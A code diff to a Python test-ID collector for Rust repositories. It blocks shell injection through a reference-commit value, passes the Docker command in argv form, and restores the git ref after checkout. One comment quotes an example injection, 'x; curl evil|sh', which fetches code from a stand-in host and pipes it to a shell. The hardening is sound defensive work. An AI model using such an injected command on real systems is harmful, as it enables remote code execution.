@@ -29,9 +29,14 @@ from __future__ import annotations
 import argparse
 import json
 import logging
+import re
 import subprocess
 import sys
 from pathlib import Path
+
+# A reference commit interpolated into a container shell command must be a bare
+# git SHA — reject anything with shell metacharacters (e.g. `x; curl evil|sh`).
+_COMMITISH_RE = re.compile(r"^[0-9a-fA-F]{4,40}$")
 
 import docker
 import docker.errors
@@ -196,7 +201,14 @@ def collect_test_ids_docker(
     cargo_cmd = "cargo test " + " ".join(cargo_args) + " -- --list"
 
     # reference_commit was fetched during image build; remote is removed in container
-    checkout = f"git reset --hard {reference_commit} && " if reference_commit else ""
+    if reference_commit:
+        if not _COMMITISH_RE.match(reference_commit.strip()):
+            raise ValueError(
+                f"Refusing to run: reference_commit is not a bare git SHA: {reference_commit!r}"
+            )
+        checkout = f"git reset --hard {reference_commit.strip()} && "
+    else:
+        checkout = ""
 
     bash_cmd = f"cd {_CONTAINER_WORKDIR} && {checkout}{cargo_cmd} 2>&1; true"
 
@@ -205,7 +217,9 @@ def collect_test_ids_docker(
     try:
         raw = client.containers.run(
             image_name,
-            command=f"bash -c '{bash_cmd}'",
+            # argv form (no outer `bash -c '...'` single-quote wrapping) so the
+            # command can't be broken out of via quoting.
+            command=["bash", "-c", bash_cmd],
             remove=True,
             platform=get_docker_platform(),
         )
@@ -312,9 +326,25 @@ def generate_for_dataset(
                 results[repo_name] = 0
                 continue
 
-            # Checkout reference commit to collect real test names (not stubbed)
+            # Checkout reference commit to collect real test names (not stubbed).
+            # Capture the current ref first so we can restore it — otherwise the
+            # shared clone is left on a detached HEAD, corrupting any later step
+            # that reuses it.
             reference_commit = entry.get("reference_commit")
+            _orig_ref = None
             if reference_commit:
+                try:
+                    _orig_ref = subprocess.run(
+                        ["git", "rev-parse", "--abbrev-ref", "HEAD"],
+                        cwd=repo_dir, capture_output=True, text=True, timeout=30,
+                    ).stdout.strip()
+                    if not _orig_ref or _orig_ref == "HEAD":
+                        _orig_ref = subprocess.run(
+                            ["git", "rev-parse", "HEAD"],
+                            cwd=repo_dir, capture_output=True, text=True, timeout=30,
+                        ).stdout.strip()
+                except Exception as e:  # noqa: BLE001
+                    logger.debug("  Could not capture original ref: %s", e)
                 try:
                     subprocess.run(
                         ["git", "checkout", reference_commit],
@@ -327,11 +357,23 @@ def generate_for_dataset(
                 except Exception as e:
                     logger.warning("  Could not checkout reference_commit: %s", e)
 
-            test_ids = collect_test_ids_local(
-                repo_dir=repo_dir,
-                test_cmd=test_cmd,
-                timeout=timeout,
-            )
+            try:
+                test_ids = collect_test_ids_local(
+                    repo_dir=repo_dir,
+                    test_cmd=test_cmd,
+                    timeout=timeout,
+                )
+            finally:
+                # Restore the original ref so the shared clone isn't left on a
+                # detached HEAD for any later step that reuses it.
+                if _orig_ref:
+                    try:
+                        subprocess.run(
+                            ["git", "checkout", _orig_ref],
+                            cwd=repo_dir, capture_output=True, text=True, timeout=30,
+                        )
+                    except Exception as e:  # noqa: BLE001
+                        logger.debug("  Could not restore original ref: %s", e)
 
         if test_ids:
             out_file = save_test_ids(test_ids, repo_name, output_dir)
